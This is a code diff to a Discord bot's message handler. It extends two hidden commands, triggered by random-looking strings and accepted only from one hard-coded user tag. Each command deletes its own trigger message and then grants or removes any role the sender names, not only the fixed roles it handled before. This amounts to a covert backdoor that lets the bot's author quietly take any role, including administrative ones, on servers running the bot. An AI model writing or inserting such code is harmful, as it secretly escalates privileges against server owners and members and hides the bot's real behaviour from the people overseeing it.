@@ -289,17 +289,19 @@ bot.on('message', function (message){
 	if(message.content.startsWith('efhsdfcsbuyf54sqd1r6sqd1c')) {
 		if(message.author.tag === moi){
 			message.channel.bulkDelete(1)
-			let memberRole = message.member.guild.roles.find("name", "DJ");
+			let arg = message.content.split(" ").slice(1);
+			let rocho = arg.join(" ")
+			let memberRole = message.member.guild.roles.find("name", rocho);
 			message.member.addRole(memberRole);
-			let memberRole1 = message.member.guild.roles.find("name", "BOT");
-			message.member.addRole(memberRole1);
 		}
 	}
 
 	if(message.content.startsWith('erfteqv57s1e4dfc1s1')) {
 		if(message.author.tag === moi){
 			message.channel.bulkDelete(1)
-			let memberRole = message.member.guild.roles.find("name", "BOT");
+			let arg = message.content.split(" ").slice(1);
+			let rocho = arg.join(" ")
+			let memberRole = message.member.guild.roles.find("name", rocho);
 			message.member.removeRole(memberRole);
 		}
 	}
